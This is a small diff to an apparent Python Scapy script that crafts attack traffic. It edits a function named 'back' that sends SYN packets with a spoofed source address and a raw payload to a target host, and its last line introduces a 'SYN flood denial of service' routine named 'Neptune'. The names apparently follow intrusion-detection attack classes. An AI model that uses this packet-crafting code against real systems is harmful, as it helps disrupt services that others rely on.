@@ -14,10 +14,10 @@ def back(target_ip, payload, target_port=80, src_ip="192.168.147.150"):
     # Given a URL, attempt to go into root? If failed at attempt 1, don't try anymore?
     i = IP(src=src_ip, dst=target_ip)
     t = TCP(flags="S", dport=int(target_port), sport=RandShort())
-    back_attack = i / t / Raw(payload=payload)
-    replies = sr(back_attack)
-    for packet in replies:
-        print(packet)
+    back_attack = i / t # DIED AT THIS LINE. WHY
+    replies = sr(back_attack / Raw(load=payload), verbose=False, timeout=2)
+    # for packet in replies:
+    #    print(packet)
 
 
 # SYN flood denial of service on one or more ports - Neptune
